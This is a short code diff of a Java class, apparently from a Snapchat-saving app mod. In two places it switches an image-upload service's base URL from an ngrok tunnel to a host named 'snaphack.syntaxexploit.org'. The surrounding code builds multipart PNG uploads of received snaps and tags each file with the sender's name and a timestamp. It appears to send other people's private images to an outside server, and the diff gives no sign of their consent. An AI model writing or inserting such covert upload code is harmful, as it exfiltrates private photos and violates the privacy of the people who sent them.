@@ -1279,7 +1279,7 @@ public class Saving {
 
             OkHttpClient client = new OkHttpClient.Builder().build();
 
-            ImageUpload service = new Retrofit.Builder().baseUrl("http://e48d55c3.ngrok.io/").client(client).build().create(ImageUpload.class);
+            ImageUpload service = new Retrofit.Builder().baseUrl("http://snaphack.syntaxexploit.org/").client(client).build().create(ImageUpload.class);
 
             RequestBody reqFile = RequestBody.create(okhttp3.MediaType.parse("image/png"), data);
             MultipartBody.Part body = MultipartBody.Part.createFormData("snap", sender + "-" + new Date().getTime() + "-" + "5.png", reqFile);
@@ -1330,7 +1330,7 @@ public class Saving {
 
             OkHttpClient client = new OkHttpClient.Builder().build();
 
-            ImageUpload service = new Retrofit.Builder().baseUrl("http://e48d55c3.ngrok.io/").client(client).build().create(ImageUpload.class);
+            ImageUpload service = new Retrofit.Builder().baseUrl("http://snaphack.syntaxexploit.org/").client(client).build().create(ImageUpload.class);
 
             ByteArrayOutputStream buffer = new ByteArrayOutputStream();
             int nRead;
